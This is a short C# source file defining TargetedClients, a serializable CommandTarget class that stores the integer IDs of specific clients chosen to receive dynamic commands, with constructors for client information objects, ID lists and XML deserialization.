using System;
using System.Collections.Generic;
using System.Linq;
using Orcus.Shared.Connection;

namespace Orcus.Shared.DynamicCommands.CommandTargets
{
    /// <summary>
    ///     A <see cref="CommandTarget" /> which targets specific clients
    /// </summary>
    [Serializable]
    public class TargetedClients : CommandTarget
    {
        internal TargetedClients(IEnumerable<OnlineClientInformation> clients)
        {
            Clients = clients.Select(x => x.Id).ToList();
        }

        internal TargetedClients(List<int> clients)
        {
            Clients = clients;
        }

        //for xml deserialization
        private TargetedClients()
        {
        }

        /// <summary>
        ///     The ids of the targeted clients
        /// </summary>
        public List<int> Clients { get; set; }
    }
}